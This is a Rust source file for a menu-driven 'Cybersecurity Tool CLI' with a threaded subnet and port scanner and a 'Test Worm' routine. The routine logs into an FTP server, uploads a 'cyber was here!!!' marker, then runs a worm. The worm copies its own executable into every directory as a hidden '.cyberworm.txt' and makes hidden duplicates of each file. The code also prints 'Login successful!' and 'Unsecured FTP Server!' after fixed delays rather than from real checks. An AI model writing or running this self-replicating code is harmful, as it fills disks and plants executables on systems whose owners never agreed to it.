extern crate ftp;

use std::str;
use std::io::Cursor;
use ftp::FtpStream;
use std::time::Duration;
use std::thread::sleep;
use std::fs;
use std::path::{Path, PathBuf};
use std::env;
use std::net::IpAddr;
use std::net::SocketAddr;
use std::net::TcpStream;
use std::thread;
use std::io;
use std::process::exit;

// Constants
const TIMEOUT_SECS: u64 = 5;

// Enum to represent user choices
enum UserChoice {
    ScanNetwork,
    TestWorm,
    Exit,
}

// Function to get user's choice
fn get_user_choice() -> UserChoice {
    println!("Cybersecurity Tool CLI");
    println!("1) Scan Network");
    println!("2) Test Worm");
    println!("3) Exit");

    let mut choice = String::new();
    io::stdin().read_line(&mut choice).expect("Error reading input");

    match choice.trim() {
        "1" => UserChoice::ScanNetwork,
        "2" => UserChoice::TestWorm,
        "3" => UserChoice::Exit,
        _ => {
            println!("Invalid choice. Exiting.");
            UserChoice::Exit
        }
    }
}

// Main function
fn main() {
    loop {
        match get_user_choice() {
            UserChoice::ScanNetwork => {
                println!("Enter subnet address (e.g., 192.168.1): ");
                let mut subnet = String::new();
                io::stdin().read_line(&mut subnet).expect("Error reading input");
                scan_network(subnet.trim());
            }
            UserChoice::TestWorm => {
                println!("Enter IP address to test worm: ");
                let mut ip_address = String::new();
                io::stdin().read_line(&mut ip_address).expect("Error reading input");
                test_worm(ip_address.trim());
            }
            UserChoice::Exit => {
                println!("Exiting.");
                break;
            }
        }
    }
}

// Function to scan a network
fn scan_network(subnet: &str) {
    for host in 1..=255 {
        let target = format!("{}.{}", subnet, host);
        thread::spawn(move || {
            if is_host_alive(&target) {
                println!("Host {} is online", target);
                scan_ports(&target);
            }
        });
    }
}

// Function to check if a host is alive
fn is_host_alive(target: &str) -> bool {
    match TcpStream::connect_timeout(
        &SocketAddr::new(IpAddr::V4(target.parse().unwrap()), 80),
        Duration::from_secs(TIMEOUT_SECS),
    ) {
        Ok(_) => true,
        Err(_) => false,
    }
}

// Function to scan ports on a host
fn scan_ports(target: &str) {
    let start_port = 1;
    let end_port = 10000;

    for port in start_port..=end_port {
        let target_clone = target.to_string();
        thread::spawn(move || {
            if is_port_open(&target_clone, port) {
                println!("Port {} is open on host {}", port, target_clone);
            }
        });
    }
}

// Function to check if a port is open
fn is_port_open(target: &str, port: u16) -> bool {
    if let Ok(_) =
        TcpStream::connect_timeout(&SocketAddr::new(IpAddr::V4(target.parse().unwrap()), port), Duration::from_secs(TIMEOUT_SECS))
    {
        true
    } else {
        false
    }
}

// Struct representing a Worm
struct Worm {
    path: String,
    target_dir_list: Vec<String>,
    iteration: usize,
    own_path: PathBuf,
}

impl Worm {
    // Constructor for Worm
    fn new(path: Option<&str>, target_dir_list: Option<Vec<String>>, iteration: Option<usize>) -> Self {
        let path = match path {
            Some(p) => p.to_string(),
            None => "/".to_string(),
        };

        let target_dir_list = match target_dir_list {
            Some(list) => list,
            None => vec![],
        };

        let iteration = match iteration {
            Some(iter) => iter,
            None => 2,
        };

        let own_path = env::current_exe().unwrap();

        Worm {
            path,
            target_dir_list,
            iteration,
            own_path,
        }
    }

    // Function to list directories recursively
    fn list_directories(&mut self, path: &str) {
        self.target_dir_list.push(path.to_string());
        if let Ok(entries) = fs::read_dir(path) {
            for entry in entries {
                if let Ok(entry) = entry {
                    let absolute_path = entry.path();
                    let file_name = absolute_path.file_name().unwrap().to_string_lossy().to_string();
                    if !file_name.starts_with('.') {
                        println!("{}", absolute_path.display());
                        if absolute_path.is_dir() {
                            self.list_directories(&absolute_path.to_string_lossy());
                        }
                    }
                }
            }
        }
    }

    // Function to create a new worm
    fn create_new_worm(&self) {
        for directory in &self.target_dir_list {
            let destination = Path::new(&directory).join(".cyberworm.txt");
            if let Err(e) = fs::copy(&self.own_path, &destination) {
                eprintln!("Error copying file: {}", e);
            }
        }
    }

    // Function to copy existing files with iterations
    fn copy_existing_files(&self) {
        for directory in &self.target_dir_list {
            if let Ok(files) = fs::read_dir(&directory) {
                for file in files {
                    if let Ok(file) = file {
                        let abs_path = file.path();
                        let file_name = abs_path.file_name().unwrap().to_string_lossy().to_string();
                        if !file_name.starts_with('.') && !abs_path.is_dir() {
                            let source = &abs_path;
                            for i in 0..self.iteration {
                                let destination = Path::new(&directory).join(format!(".{}{}{}", file_name, i, i));
                                if let Err(e) = fs::copy(source, &destination) {
                                    eprintln!("Error copying file: {}", e);
                                }
                            }
                        }
                    }
                }
            }
        }
    }

    // Function to perform worm actions
    fn start_worm_actions(&mut self) {
        self.create_new_worm();
        self.copy_existing_files();
    }
}
fn test_worm(ip_address: &str) {
    
        // Create a connection to an FTP server and authenticate to it.
        let server_address = format!("{}:21", ip_address);
        let mut ftp_stream = match FtpStream::connect(&server_address) {
            Ok(stream) => stream,
            Err(err) => {
                eprintln!("Error connecting to FTP server: {}", err);
                exit(1);
            }
        };

        //Getting user input for data
        let mut string = String::new();
        println!("Enter Username: ");
        let _username = std::io::stdin().read_line(&mut string).unwrap();
        let mut string1 = String::new();
        println!("Enter Password: ");
        let _password = std::io::stdin().read_line(&mut string1).unwrap();
        let _ = ftp_stream.login(&string, &string1).unwrap();
    
        println!("Checking login credentials, please wait....");
        //Adding a pause ..Checking login Credentials, please wait...
        //pause();
    
        let time = Duration::from_secs(3);
    
        sleep(time);
    
        println!("Login successful!");
    
         //pause();
    
         let time = Duration::from_secs(1);
    
         sleep(time);
    
         println!("Unsecured FTP Server!");
    
         let time = Duration::from_secs(1);
    
         sleep(time);
        
        // Get the current directory that the client will be reading from and writing to.
        println!("Current directory: {}", ftp_stream.pwd().unwrap());
    
        let path = "/files/";
        let b: bool = Path::new(path).is_dir();
        println!("{} exists: {}", path, b);
    
        // fs::create_dir_all does create parent folders
        let r = fs::create_dir_all(path);
        match r {
            Err(e) => println!("error creating {}: {}", path, e),
            Ok(_) => println!("created {}: OK", path),
        }
    
         //pause();
    
         let time = Duration::from_secs(1);
    
         sleep(time);
    
         let _ = ftp_stream.cwd("files").unwrap();
    
         println!("Current directory: {}", ftp_stream.pwd().unwrap());
        
    
        // Store a file to the current working directory of the server.
        let mut reader = Cursor::new("cyber was here!!!".as_bytes());
        let _ = ftp_stream.put("cyberworm.txt", &mut reader);
        let paths = fs::read_dir("/srv/ftp/files").unwrap();
         for path in paths {
            println!("Name: {}", path.unwrap().path().display())
        }
    
        //Wait (pause)
          let time = Duration::from_secs(1);
    
         sleep(time);
    
         let current_directory = env::current_dir().unwrap();
         let mut worm = Worm::new(Some(&current_directory.to_string_lossy()), None, None);
         worm.start_worm_actions();
    
        println!("cyber was here!!");
        // Terminate the connection to the server.
        let _ = ftp_stream.quit();
    
        
    
}

